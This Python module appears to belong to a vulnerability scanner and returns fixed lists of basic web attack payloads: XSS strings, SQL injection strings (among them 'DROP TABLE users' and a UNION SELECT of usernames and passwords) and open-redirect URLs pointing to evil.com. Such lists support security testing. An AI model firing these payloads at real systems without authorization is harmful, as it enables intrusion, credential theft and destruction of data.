#!/usr/bin/env python3
"""
Payload recommender for vulnerability assessment
"""

from typing import List, Dict, Any, Optional
from .targets import Target

def recommend_for_target(family: str, target: Target) -> List[Dict[str, Any]]:
    """
    Recommend payloads for a specific vulnerability family and target.
    
    Args:
        family: Vulnerability family (xss, sqli, redirect, etc.)
        target: Target to recommend payloads for
        
    Returns:
        List of recommended payloads
    """
    if family == "xss":
        return _recommend_xss_payloads(target)
    elif family == "sqli":
        return _recommend_sqli_payloads(target)
    elif family == "redirect":
        return _recommend_redirect_payloads(target)
    else:
        return []

def _recommend_xss_payloads(target: Target) -> List[Dict[str, Any]]:
    """Recommend XSS payloads based on target context"""
    payloads = []
    
    # Basic XSS payloads
    basic_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    ]
    
    for payload in basic_payloads:
        payloads.append({
            "payload": payload,
            "type": "xss",
            "context": "html",
            "description": "Basic XSS payload"
        })
    
    return payloads

def _recommend_sqli_payloads(target: Target) -> List[Dict[str, Any]]:
    """Recommend SQLi payloads based on target context"""
    payloads = []
    
    # Basic SQLi payloads
    basic_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users;--",
        "' UNION SELECT NULL, username, password FROM users--",
        "' OR 1=1 LIMIT 1--"
    ]
    
    for payload in basic_payloads:
        payloads.append({
            "payload": payload,
            "type": "sqli",
            "context": "query",
            "description": "Basic SQLi payload"
        })
    
    return payloads

def _recommend_redirect_payloads(target: Target) -> List[Dict[str, Any]]:
    """Recommend redirect payloads based on target context"""
    payloads = []
    
    # Basic redirect payloads
    basic_payloads = [
        "https://evil.com",
        "//evil.com",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "ftp://evil.com"
    ]
    
    for payload in basic_payloads:
        payloads.append({
            "payload": payload,
            "type": "redirect",
            "context": "query",
            "description": "Basic redirect payload"
        })
    
    return payloads